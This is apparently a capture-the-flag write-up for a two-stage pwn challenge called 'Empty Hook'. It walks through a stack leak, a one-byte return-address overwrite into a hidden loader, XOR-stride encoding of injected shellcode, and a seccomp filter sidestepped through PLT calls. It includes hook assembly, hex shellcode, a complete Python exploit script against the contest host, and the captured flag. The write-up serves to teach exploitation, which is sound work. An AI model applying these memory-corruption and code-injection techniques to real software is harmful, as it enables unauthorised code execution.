# Empty Hook — Writeup

This challenge is a two-stage pwn built around a hidden code-loading path.

The key idea is: the program contains an **“empty hook”** region in `.text`, but under normal execution that region is never populated. Our job is to use the first bug to redirect control flow into the hidden loader, then use the second stage to place encoded shellcode-like bytes in `.bss` so the program decodes them into the hook and executes them. The hook then opens `/flag` and prints it.

## Challenge overview

The binary gives us two important primitives:

1. A **stack leak** in the first interaction.
2. A **stack overflow** in the second interaction.

There is also a hidden loader routine that reads attacker-controlled data into `.bss` and later decodes a hook into an all-NOP executable area inside `.text`.

So the intended structure is exactly what the challenge hint says: there is an **“empty hook”** waiting to be filled.

## What the program does

From reversing the binary, the relevant behavior is:

- First, it reads user input into a stack buffer.
- Then it writes back `0x108` bytes from that same stack area.

That is already a bug, because the program does not only print our input. It also prints adjacent stack data.

Later, the program performs another read into a `0x80`-byte stack buffer, but it reads up to `0x200` bytes. That gives a straightforward stack overflow.

So we immediately know the challenge is probably:

- **stage 1:** leak something useful
- **stage 2:** use the overflow to reach a hidden path

## Stage 1: the leak

The first bug is a very nice stack disclosure.

The program writes back `0x108` bytes from the stack. The last 8 leaked bytes are extremely valuable:

- the highest byte is a random-looking **key** used by the hook decoder
- the lower 7 bytes reveal a **stack pointer value**

In practice, I treated those 8 bytes as:

- `key = leaked_byte[7]`
- `leak_low56 = lower 56 bits from the first 7 bytes`
- `main_rbp = leak_low56 + 0x130`

That reconstructed the saved frame base used later in the vulnerable function.

This leak is the reason the exploit is reliable even though the program uses runtime-dependent values.

## Stage 2: the stack overflow

The second vulnerable read writes `0x200` bytes into a buffer of size `0x80`.

That means we can overwrite:

- the saved `rbp`
- the saved return address

At first glance, classic ROP would work, but the challenge is designed around a more elegant path.

There is a hidden branch near the return site. Under normal execution, the function returns to one instruction. But if we change the low byte of the saved RIP, we can make it return two bytes later into a different basic block.

The important part is:

- normal path returns to something like `...12e1`
- we want to return to `...12e3`

At `...12e3` there is a call to the hidden `.bss` reader, and then execution rejoins the normal path.

So instead of building a full ROP chain, we only need:

- restore saved `rbp` to the correct value leaked in stage 1
- partially overwrite the saved RIP so the low byte becomes `0xe3`

That is enough to redirect execution into the hidden call.

This is why the exploit is so compact.

## The hidden `.bss` loading path

Once execution is redirected into that hidden path, the program reads another attacker-controlled buffer into `.bss`.

That buffer is not used directly. Instead, a later routine checks for a specific structure:

- a 32-bit magic value at `0x40e0`
- an 8-byte hook size at `0x40e8`
- encoded hook bytes starting from a key-dependent layout in the surrounding `.bss` area

The magic check is:

```text
0xb136804f
```

If the magic is present, the program decodes attacker data from `.bss` into the hook region in `.text`.

That “hook” region is the empty executable area mentioned by the challenge title and hint.

## How the hook is encoded

The decoder does not copy bytes linearly.

It computes:

- `start offset = 0x90 + ((key >> 2) & 3)`
- `stride = (key & 3) + 2`

Then for each byte of the hook:

```text
decoded_hook[i] = bss[start + i * stride] ^ key
```

So the stage 2 payload must place the encoded hook bytes at those positions in `.bss`, not as a contiguous blob.

This is where the leak from stage 1 becomes necessary: without the leaked key, we would not know how to encode the hook correctly.

## The seccomp restriction

Before the decoded hook is executed, the program installs a seccomp filter.

The allowed syscalls are limited, but fortunately they include exactly what we need:

- `openat`
- `read`
- `write`
- `close`
- `exit`
- `exit_group`

There is another restriction: the program scans the decoded hook and rejects it if it contains the opcode bytes:

```text
0f 05
```

That is the raw `syscall` instruction on x86-64.

So our hook cannot contain a literal `syscall` instruction.

The intended workaround is simple: call the already existing PLT stubs in the binary instead.

That means:

- use `syscall@plt` for `openat`
- use `read@plt` to read `/flag`
- use `write@plt` to print it

This completely avoids embedding `0f 05` in the hook itself.

## The final hook

The hook does:

1. allocate stack space
2. call `syscall@plt` with `sys_openat`, `AT_FDCWD`, `"/flag"`, `0`, `0`
3. call `read@plt(fd, rsp, 0x100)`
4. call `write@plt(1, rsp, n)`
5. return

In assembly logic, it is:

```asm
sub rsp, 0x100
mov edi, 0x101
mov esi, -100
lea rdx, [rip + path]
xor ecx, ecx
xor r8d, r8d
call syscall@plt

mov edi, eax
mov rsi, rsp
mov edx, 0x100
call read@plt

mov edx, eax
mov edi, 1
mov rsi, rsp
call write@plt

add rsp, 0x100
ret

path:
"/flag\0"
```

Note that `syscall@plt` here is the libc `syscall` wrapper, so the arguments follow that wrapper’s calling convention, not raw kernel syscall register placement.

## Putting it all together

The exploit flow is:

1. Send a tiny first input to trigger the `0x108`-byte leak.
2. Parse the last 8 leaked bytes.
3. Recover:
   - the decoder key
   - the correct saved `rbp` value for the vulnerable frame
4. Send the overflow payload:
   - `0x80` bytes padding
   - saved `rbp =` corrected frame base
   - one-byte partial RIP overwrite to `0xe3`
5. The program now reaches the hidden `.bss` read.
6. Send the encoded stage 2 buffer:
   - magic at offset `0x80`
   - hook size at offset `0x88`
   - encoded hook bytes placed using the key-derived stride
7. The program decodes the hook into the empty executable region and jumps to it.
8. The hook opens `/flag` and prints it.

## Why the challenge says “there are two stages”

That line refers to the two different attacker actions:

**First stage:** use the stack leak and the partial-return overwrite to enter the hidden loader.

**Second stage:** feed encoded hook data into `.bss` so the program materializes executable attacker code in the empty hook region.

So the challenge is not “two separate binaries” or “two remote services”. It is one exploit with two payload phases.

## A clean exploit script

Here is the exploit I used, written as a normal socket script.

```python
import socket
import struct
import re

HOST = "chal.polyuctf.com"
PORT = 33421

HOOK = bytes.fromhex(
    "4881ec00010000"
    "bf01010000"
    "be9cffffff"
    "488d1530000000"
    "31c9"
    "4531c0"
    "e8caf9ffff"
    "89c7"
    "4889e6"
    "ba00010000"
    "e8abf9ffff"
    "89c2"
    "bf01000000"
    "4889e6"
    "e86cf9ffff"
    "4881c400010000"
    "c3"
    "2f666c616700"
)

assert b"\x0f\x05" not in HOOK

def recv_until(sock, marker):
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def p64(x):
    return struct.pack("<Q", x)

def build_stage2(key: int) -> bytes:
    step = (key & 3) + 2
    off  = (key >> 2) & 3
    size = len(HOOK)

    max_idx = 0x90 + off + (size - 1) * step
    buf = bytearray(max_idx + 1)

    buf[0x80:0x84] = struct.pack("<I", 0xb136804f)
    buf[0x88:0x90] = struct.pack("<Q", size)

    for i, b in enumerate(HOOK):
        buf[0x90 + off + i * step] = b ^ key

    return bytes(buf)

def main():
    s = socket.create_connection((HOST, PORT))

    s.sendall(b"A")
    out = recv_until(s, b"What's your input?\nIt seems that something is lost. QAQ\n")

    idx = out.index(b"What's your input?\n")
    leak = out[idx - 8:idx]

    key = leak[7]
    leak_low56 = int.from_bytes(leak[:7] + b"\x00", "little")
    main_rbp = leak_low56 + 0x130

    print(f"[+] key      = 0x{key:02x}")
    print(f"[+] leak56   = 0x{leak_low56:x}")
    print(f"[+] main_rbp = 0x{main_rbp:x}")

    payload1 = b"B" * 0x80 + struct.pack("<Q", main_rbp) + b"\xe3"
    s.sendall(payload1)

    out2 = recv_until(s, b"data:\n")
    print(out2.decode("latin1", errors="ignore"), end="")

    payload2 = build_stage2(key)
    s.sendall(payload2)
    s.shutdown(socket.SHUT_WR)

    rest = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        rest += chunk

    print(rest.decode("latin1", errors="ignore"))

    m = re.search(rb"PUCTF26\{[^}]+\}", rest)
    if m:
        print("[+] FLAG =", m.group().decode())

if __name__ == "__main__":
    main()
```

## Final takeaway

This challenge is nice because it is not just a plain overflow into ROP.

The intended path is:

- leak the decoder key and stack layout
- use a one-byte RIP overwrite to reach a hidden read into `.bss`
- satisfy the loader format
- exploit the empty hook mechanism itself
- respect seccomp and the no-syscall-byte rule by calling existing PLT functions

That is why the title is **“Empty Hook”**: the hook is already there, but it is literally empty until we make the program fill it for us.

Flag : PUCTF26{DoY0uL1KeHo0k_7LavVdujZlYw9pejhYBaPqtD8B2GCgwO}